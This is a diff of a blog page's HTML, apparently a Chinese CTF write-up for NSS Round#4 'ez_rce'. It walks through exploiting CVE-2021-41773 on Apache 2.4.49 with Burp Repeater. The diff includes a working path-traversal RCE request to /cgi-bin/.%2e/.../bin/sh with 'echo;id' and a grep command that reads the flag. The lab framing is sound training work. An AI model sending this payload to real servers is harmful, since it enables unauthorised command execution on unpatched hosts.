@@ -15,7 +15,7 @@
   
   <link rel="canonical" href="http://mykonos-x.github.io/2022/08/08/NSS-Round-4-ez-rce/">
   
-  <meta name="description" content="ez_rce(NSSRound#4)笔者尽量写的详细一点，方便大家理解和复现 TOPIC&amp;amp;ANALYSE 页面只有”It works”字样 寻找突破口 我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix) 尝试从此入手 得知Apache/">
+  <meta name="description" content="ez_rce(NSSRound#4) 笔者尽量写的详细一点，方便大家理解和复现 TOPIC&amp;amp;ANALYSE  页面只有&amp;quot;It works&amp;quot;字样 寻找突破口 我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix) 尝试从此">
   
   
   <meta name="author" content="Ez3ki3l">
@@ -26,14 +26,14 @@
   <meta property="og:type" content="article" />
   <meta property="og:title" content="NSS Round#4 ez_rce" />
   
-  <meta property="og:description" content="ez_rce(NSSRound#4)笔者尽量写的详细一点，方便大家理解和复现 TOPIC&amp;amp;ANALYSE 页面只有”It works”字样 寻找突破口 我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix) 尝试从此入手 得知Apache/">
+  <meta property="og:description" content="ez_rce(NSSRound#4) 笔者尽量写的详细一点，方便大家理解和复现 TOPIC&amp;amp;ANALYSE  页面只有&amp;quot;It works&amp;quot;字样 寻找突破口 我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix) 尝试从此">
   
   <meta property="og:url" content="http://mykonos-x.github.io/2022/08/08/NSS-Round-4-ez-rce/" />
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="NSS Round#4 ez_rce">
   
-  <meta name="twitter:description" content="ez_rce(NSSRound#4)笔者尽量写的详细一点，方便大家理解和复现 TOPIC&amp;amp;ANALYSE 页面只有”It works”字样 寻找突破口 我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix) 尝试从此入手 得知Apache/">
+  <meta name="twitter:description" content="ez_rce(NSSRound#4) 笔者尽量写的详细一点，方便大家理解和复现 TOPIC&amp;amp;ANALYSE  页面只有&amp;quot;It works&amp;quot;字样 寻找突破口 我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix) 尝试从此">
   
   
   
@@ -193,36 +193,42 @@
         <div class="trans">
             <h2>NSS Round#4 ez_rce</h2>
 
-  <h3 id="ez-rce-NSSRound-4"><a href="#ez-rce-NSSRound-4" class="headerlink" title="ez_rce(NSSRound#4)"></a>ez_rce(NSSRound#4)</h3><p>笔者尽量写的详细一点，方便大家理解和复现</p>
-<h4 id="TOPIC-amp-ANALYSE"><a href="#TOPIC-amp-ANALYSE" class="headerlink" title="TOPIC&amp;ANALYSE"></a>TOPIC&amp;ANALYSE</h4><p><img src="https://pic.imgdb.cn/item/62f0cb6d16f2c2beb1ab3605.jpg" alt=""></p>
-<p>页面只有”It works”字样</p>
+  <h3><span id="ez_rcenssround4">ez_rce(NSSRound#4)</span></h3>
+<p>笔者尽量写的详细一点，方便大家理解和复现</p>
+<h4><span id="topicampanalyse">TOPIC&amp;ANALYSE</span></h4>
+<p><img src="https://pic.imgdb.cn/item/62f0cb6d16f2c2beb1ab3605.jpg" alt></p>
+<p>页面只有&quot;It works&quot;字样</p>
 <p>寻找突破口</p>
 <p>我们通过开发者工具看到网络信息-标头-Server看到服务器采用的是Apache/2.4.49(Unix)</p>
 <p>尝试从此入手</p>
 <p>得知Apache/2.4.49(Unix)有目录穿越漏洞，我们以此为突破口</p>
-<h4 id="CVE-2021-41773"><a href="#CVE-2021-41773" class="headerlink" title="CVE-2021-41773"></a>CVE-2021-41773</h4><ul>
-<li><p>Apache版本 = 2.4.49</p>
+<h4><span id="cve-2021-41773">CVE-2021-41773</span></h4>
+<ul>
+<li>
+<p>Apache版本 = 2.4.49</p>
 </li>
-<li><p>穿越的目录允许被访问</p>
+<li>
+<p>穿越的目录允许被访问</p>
 </li>
 </ul>
 <p>在服务端开启了gi或者cgid这两个mod的情况下，这个目录穿越漏洞可以执行任意命令</p>
-<h4 id="ATTACK"><a href="#ATTACK" class="headerlink" title="ATTACK"></a>ATTACK</h4><p><img src="https://pic.imgdb.cn/item/62f0d7fd16f2c2beb1e17051.jpg" alt=""></p>
+<h4><span id="attack">ATTACK</span></h4>
+<p><img src="https://pic.imgdb.cn/item/62f0d7fd16f2c2beb1e17051.jpg" alt></p>
 <p>我们拦截到数据包之后，通过Action-Send to Repeater进入重发模块，在这里可以对数据包进行修改并且即时得到回显</p>
-<p><img src="https://pic.imgdb.cn/item/62f0d8c316f2c2beb1e44d41.jpg" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/62f0d8c316f2c2beb1e44d41.jpg" alt></p>
 <p>在Request处右键，选择Change request method，将GET方法改成POST方法，接着就可以写入payload了</p>
-<p><img src="https://pic.imgdb.cn/item/62f0d71416f2c2beb1de19d5.jpg" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/62f0d71416f2c2beb1de19d5.jpg" alt></p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</span> <span class="token http-version property">HTTP/1.1</span></span>
 ...
 echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>重点在<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code>，<code>%2e</code>是<code>.</code>的url编码，所以这一段其实就是<code>/cgi-bin/../../../../bin/sh</code></p>
 <p><code>echo;xxx</code>则是命令执行</p>
-<p><img src="https://pic.imgdb.cn/item/62f0dc0d16f2c2beb1f0ede9.jpg" alt=""></p>
-<p><img src="https://pic.imgdb.cn/item/62f0dc5516f2c2beb1f23113.jpg" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/62f0dc0d16f2c2beb1f0ede9.jpg" alt></p>
+<p><img src="https://pic.imgdb.cn/item/62f0dc5516f2c2beb1f23113.jpg" alt></p>
 <p>跟进/flag_is_here发现还有文件夹</p>
 <p>这里我们用grep来进行过滤来读flag</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span><span class="token punctuation">;</span><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token string">"NSS"</span> /flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://pic.imgdb.cn/item/62f0dceb16f2c2beb1f4e168.jpg" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/62f0dceb16f2c2beb1f4e168.jpg" alt></p>
 <p>DONE</p>
 
   <p><a class="classtest-link" href="/tags/web/" rel="tag">web</a>, <a class="classtest-link" href="/tags/write-up/" rel="tag">write-up</a> — Aug 8, 2022</p>
